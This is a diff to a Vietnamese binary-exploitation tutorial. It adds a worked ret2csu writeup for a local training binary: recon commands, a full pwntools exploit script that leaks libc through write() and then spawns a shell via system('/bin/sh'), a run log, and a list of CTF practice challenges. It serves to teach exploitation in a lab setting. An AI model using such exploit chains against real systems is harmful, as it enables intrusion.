@@ -222,10 +222,104 @@ hoặc chuyển hướng ret2dlresolve/SROP.
 
 ---
 
-## 11. Luyện tập
+## 11. Writeup mẫu — `BOF_ret2csu` (phong cách pwnld, đã verify ra shell)
 
-- **ROP Emporium – "ret2csu"**: bài chuẩn để tập (phải set `rdx` không có `pop rdx`).
-- Binary local có csu để nghịch: `bof6`, `bof1`, `bof9`, `fmtstr2`... (xem §3 cách disassemble).
+Bài `tutorial/bof/BOF_ret2csu` (biên dịch `-no-pie -fno-stack-protector`), nguồn:
+```c
+void vuln(){ char buff[40]; write(1,"Enter Data - ",13); read(0,buff,300); }
+int main(){ vuln(); }
+```
+Không có `win`/`system`, binary **liên kết động** → kế hoạch **2 tầng**: (1) ret2csu gọi
+`write(1, got.write, 8)` **leak libc**, quay về `main`; (2) **ret2libc** `system("/bin/sh")`.
+
+**Recon (đã verify):**
+```bash
+checksec --file=ret2csu          # No PIE, No canary
+objdump -R ret2csu | grep -E 'write|read'   # write@got=0x404018, read@got=0x404020
+ROPgadget --binary ret2csu | grep ': pop rdi ; ret$'   # 0x401213 (chồng byte với pop r15)
+# offset tới ret = 56  (buff[40] + lề 8 + saved rbp 8; dò bằng cyclic+corefile)
+```
+
+**exploit.py (pwnld-style):**
+```python
+#!/usr/bin/env python3
+from pwn import *
+from pwnld import *
+
+context.binary = exe = ELF("./ret2csu", checksec=False)
+rop  = ROP(exe)
+libc = get_libc()
+
+set_remote("host", 0)
+set_gdbscript("b *vuln\nc")
+p = start()
+GDB()
+
+POP_RDI = 0x401213          # pop rdi ; ret   (chồng byte với 'pop r15' của csu)
+RET     = 0x401214          # ret             (căn 16-byte cho system -> tránh movaps SIGSEGV)
+OFF     = 56
+
+### Stage 1: ret2csu -> write(1, got.write, 8) leak libc, rồi quay về main
+rop.ret2csu(edi=1, rsi=exe.got.write, rdx=8, call=exe.got.write)   # r15=got.write -> call write; rsi=got.write -> in nội dung ô GOT
+rop.call(exe.sym.main)
+sa("Enter Data - ", flat(cyclic(OFF), rop.chain()))
+
+leak_libc_s(libc.sym.write, n=6)    # đọc 6 byte write vừa in -> libc.address TỰ rebase
+assert libc.address & 0xFFF == 0, f"leak sai/lệch: {hex(libc.address)}"
+
+### Stage 2: ret2libc system("/bin/sh")
+binsh = next(libc.search(b"/bin/sh\x00"))
+sa("Enter Data - ", flat(cyclic(OFF), POP_RDI, binsh, RET, libc.sym.system))
+
+ia()
+```
+
+**Vì sao viết vậy:**
+- `rop.ret2csu(edi=1, rsi=exe.got.write, rdx=8, call=exe.got.write)` → `write(1, got.write, 8)`:
+  tham số 1 = `1` (stdout) qua `edi` (số nhỏ, hợp ràng buộc 32-bit §5.2); `call=got.write` cho
+  pwntools đặt `r15=got.write` để `call [r15]` = gọi `write`; `rsi=got.write` để **in nội dung ô
+  GOT** = địa chỉ libc thật của `write`.
+- `rop.call(exe.sym.main)` nối sau để **quay lại** (cần vì phải nhập lần 2 cho stage 2) — đúng ý
+  "nhiều chain" trong [rop.md](pwntools/rop.md#nhiều-chain--nhiều-tầng-leak--rebase--đánh-thật).
+- `leak_libc_s(libc.sym.write, n=6)`: `write` in **8 byte, không có `\n`** → đọc theo **số byte**
+  (`n=6`, lấy 6 byte thấp), không dùng recvline. Rồi `assert` base page-aligned (bắt leak sai).
+- `RET` (một `ret` đơn) trước `system`: căn `rsp` về bội 16 → tránh `system` SIGSEGV ở lệnh
+  `movaps` (xem dưới).
+
+**Log chạy thật (local):**
+```
+LIBC LEAK ==== 0x7b172dd1c830
+LIBC BASE ==== 0x7b172dc00000        <- page-aligned, leak đúng
+$ id
+uid=1000(...) gid=1000(...)          <- có shell
+```
+
+**Thí nghiệm căn lề (chứng minh `RET` là bắt buộc):**
+| Stage 2 | Kết quả |
+|---------|---------|
+| `POP_RDI, binsh, RET, system` | ✅ ra shell |
+| `POP_RDI, binsh, system` (bỏ `RET`) | ❌ SIGSEGV (-11) tại `movaps` trong `do_system` |
+
+→ Dấu hiệu nhận ra lỗi lề: crash **bên trong libc** (địa chỉ hợp lệ, trong `do_system`), không
+phải địa chỉ rác. Thêm **đúng một** `ret` là xong.
+
+> Phiên bản pwntools thuần cho cùng bài: thay `sa(...)`/`leak_libc_s` bằng `p.sendafter(...)` +
+> `u64(p.recvn(8)[:6].ljust(8,b"\\x00"))`. pwnld chỉ gói gọn lại các bước đó.
+
+---
+
+## 12. Danh sách bài tập + writeup tham khảo
+
+| Bài | Mức | Học gì | Writeup / gợi ý |
+|-----|-----|--------|------------------|
+| **`BOF_ret2csu`** (local) | ⭐ dễ | csu leak libc + ret2libc + căn lề | **§11 ở trên** (pwnld, verify ra shell) |
+| **ROP Emporium – ret2csu** (challenge 7) | ⭐⭐ | set `rdx` khi không có `pop rdx`; pivot chain 2 | [ir0nstone](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation), [ricardojoserf/rop-emporium-exploits](https://github.com/ricardojoserf/rop-emporium-exploits) |
+| **DiceCTF – babyrop** | ⭐⭐⭐ | csu leak libc qua `write` khi ret2libc kẹt vì thiếu `rdx` | [ctftime 26222](https://ctftime.org/writeup/26222) |
+| CTF khác gắn tag `ret2csu` | ⭐⭐⭐ | biến thể (ghép SROP/ret2dlresolve) | [ctftime 25967](https://ctftime.org/writeup/25967), [25806](https://ctftime.org/writeup/25806), [27641](https://ctftime.org/writeup/27641), [26026](https://ctftime.org/writeup/26026) |
+| Binary local có csu để nghịch gadget | — | tập disassemble §3 | `bof6`, `bof1`, `bof9`, `fmtstr2` |
+
+**Lộ trình luyện đề nghị:** `BOF_ret2csu` (nắm luồng 2 tầng) → ROP Emporium ret2csu (tự set `rdx`,
+pivot) → một bài CTF ghép csu + leak (babyrop) → bài ghép csu với SROP/ret2dlresolve.
 
 ---
 
